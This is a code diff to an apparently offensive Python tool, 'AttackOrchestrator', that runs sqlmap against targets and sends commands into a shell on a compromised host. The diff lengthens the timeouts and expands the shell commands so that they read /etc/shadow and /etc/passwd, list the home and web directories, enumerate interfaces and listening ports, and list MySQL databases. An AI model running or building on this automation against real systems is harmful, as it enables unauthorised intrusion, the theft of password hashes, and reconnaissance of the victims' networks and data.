@@ -297,7 +297,7 @@ class AttackOrchestrator:
             if cookie:
                 cmd += ["--cookie", cookie]
 
-            result = subprocess.run(cmd, capture_output=True, text=True, timeout=240)
+            result = subprocess.run(cmd, capture_output=True, text=True, timeout=480)
             output = result.stdout + result.stderr
             success = ("injectable" in output.lower()
                        or "sqlmap identified" in output.lower()
@@ -310,7 +310,7 @@ class AttackOrchestrator:
         except FileNotFoundError:
             return {"success": False, "output": "[ERROR] sqlmap not installed"}
         except subprocess.TimeoutExpired:
-            return {"success": False, "output": "[TIMEOUT] SQLMap exceeded 4 minutes"}
+            return {"success": False, "output": "[TIMEOUT] SQLMap exceeded 8 minutes — target may not have injectable parameters or requires authentication"}
         except Exception as e:
             return {"success": False, "output": f"SQLMap error: {str(e)}"}
 
@@ -491,9 +491,18 @@ class AttackOrchestrator:
             )
 
             # Send identification commands
-            commands = "id\nwhoami\nuname -a\ncat /etc/passwd\nexit\n"
+            commands = (
+                "id\nwhoami\nuname -a\ncat /etc/passwd\n"
+                "cat /etc/shadow 2>/dev/null\n"
+                "ls -la /home/\nls -la /var/www/ 2>/dev/null\n"
+                "cat /etc/hostname\n"
+                "ifconfig 2>/dev/null || ip a\n"
+                "netstat -tlnp 2>/dev/null || ss -tlnp\n"
+                "mysql -e 'SHOW DATABASES;' 2>/dev/null\n"
+                "exit\n"
+            )
             stdout, stderr = proc.communicate(
-                input=commands.encode(), timeout=15
+                input=commands.encode(), timeout=30
             )
             output = stdout.decode(errors='ignore')
 
